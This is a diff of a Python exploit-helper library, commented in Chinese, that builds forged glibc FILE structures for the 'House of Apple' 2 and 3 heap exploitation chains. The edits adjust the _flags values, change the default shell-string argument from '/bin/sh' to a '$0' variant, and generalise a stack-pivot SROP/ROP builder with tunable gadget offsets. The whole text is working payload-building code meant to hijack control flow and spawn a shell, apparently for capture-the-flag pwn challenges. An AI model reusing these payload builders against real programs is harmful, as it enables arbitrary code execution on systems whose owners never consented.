@@ -130,16 +130,17 @@ def HOA1(wstrn_jumps_addr, target, value, chain = 0):
     
     return payload
 
-def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b'  /bin/sh\x00'):
+# def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b'  /bin/sh\x00'):
+def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00'):
     '''
         House of apple 2的overflow攻击链
         _IO_wfile_jumps: _IO_wfile_jumps地址
         payload_addr: payload将要写入的地址
         fun: 要调用的函数的地址
         param: 函数传入的指针的值, 默认/bin/sh
-    '''    
+    '''
     payload = b''
-    payload = set_value(payload, 0x0, 0);                                   # fp->_flags = 0 || fp->_flags = value ^ (0x0008 | 0x0800 | 0x0002)
+    payload = set_value(payload, 0x0, 0x8000);                              # fp->_flags = 0 || fp->_flags = value ^ (0x0008 | 0x0800 | 0x0002)
     payload = set_value(payload, 0x20, 0);                                  # fp->_IO_write_base = 0
     payload = set_value(payload, 0x28, 1);                                  # fp->_IO_write_ptr = 1
     payload = set_value(payload, 0x38, 1);                                  # fp->_IO_buf_base = 1
@@ -155,7 +156,8 @@ def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b'  /bin/sh\x00'):
     payload = param + payload[len(param):]
     return payload
 
-def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b'  $0\x00'):
+# def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b'  $0\x00'):
+def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00'):
     '''
         House of apple 2的underflow攻击链
         _IO_wfile_jumps: _IO_wfile_jumps地址
@@ -164,7 +166,7 @@ def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b'  $0\x00'):
         param: 函数传入的指针的值, 默认/bin/sh
     '''
     payload = b''
-    payload = set_value(payload, 0x0, 0);                                       # fp->_flags = 0 或者 fp->_flags = value ^ (0x10 | 0x04 | 0x02)
+    payload = set_value(payload, 0x0, 0x8000);                                  # fp->_flags = 0 或者 fp->_flags = value ^ (0x10 | 0x04 | 0x02)
     payload = set_value(payload, 0x8, 1);                                       # fp->_IO_read_ptr = 1
     payload = set_value(payload, 0x10, 0);                                      # fp->_IO_read_end = 0
     payload = set_value(payload, 0x20, 0);                                      # fp->_IO_write_base = 0
@@ -257,7 +259,7 @@ def HOA3underflow2(_IO_wfile_jumps, payload_addr, fun, param1_value_offset_8 = b
     # 设置第四个参数
     payload = set_value(payload, 0x10, param4);                     # fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
     
-    payload = set_value(payload, 0x0, 0);                           # fp->_flags = 0
+    payload = set_value(payload, 0x0, 0x8000);                      # fp->_flags = 0x8000
     # payload = set_value(payload, 0x8, 0);                         # fp->_IO_read_ptr : 第三个参数指向的地址的值
     # payload = set_value(payload, 0x10, param4);                   # fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
     payload = set_value(payload, 0x20, 0);                          # fp->_IO_write_base = 0
@@ -276,15 +278,17 @@ def HOA3underflow2(_IO_wfile_jumps, payload_addr, fun, param1_value_offset_8 = b
     
     return payload
 
-def HOA3underflow_srop2(_IO_wfile_jumps, payload_addr, pop_rsp_ret, push_rsi_jmp_rsi_n, add_rsp_0x28_ret, n, rop, rop_addr = 0):
+def HOA3underflow2_srop(_IO_wfile_jumps, payload_addr, pop_rsp_ret, push_rsi_jmp_rsi_n1, add_rsp_n2_ret, n1, n2, rop, rop_addr = 0):
     '''
         利用HOA3的underflow攻击链, 实现srop
         
         _IO_wfile_jumps: _IO_wfile_jumps地址
         payload_addr: payload将要写入的地址
         pop_rsp_ret : pop rsp; ret
-        push_rsi_jmp_rsi_n: push rsi; jmp qword ptr [rsi + n]
-        add_rsp_0x28_ret: add rsp, 0x28; ret
+        push_rsi_jmp_rsi_n1: push rsi; jmp qword ptr [rsi + n1]
+        add_rsp_n2_ret: add rsp, 0x28; ret
+        n1 : 建议0x66
+        n2 : 建议0x28
         rop: ROP链
         rop_addr: ROP链将要写入的地址, 0则内置ROP链
         
@@ -296,10 +300,10 @@ def HOA3underflow_srop2(_IO_wfile_jumps, payload_addr, pop_rsp_ret, push_rsi_jmp
         addr = rop_addr
     payload = HOA3underflow2(_IO_wfile_jumps, 
                             payload_addr,
-                            push_rsi_jmp_rsi_n,
+                            push_rsi_jmp_rsi_n1,
                             p64(0),
-                            set_value(  (p64(add_rsp_0x28_ret) + b'\x00'*(0xf - 8)).ljust(0x30, b'\x00') + p64(pop_rsp_ret) + p64(addr),
-                                        n,
+                            set_value(  (p64(add_rsp_n2_ret) + b'\x00'*(0xf - 8)).ljust(n2 + 8, b'\x00') + p64(pop_rsp_ret) + p64(addr),
+                                        n1,
                                         pop_rsp_ret),
                             p64(0),
                             1)
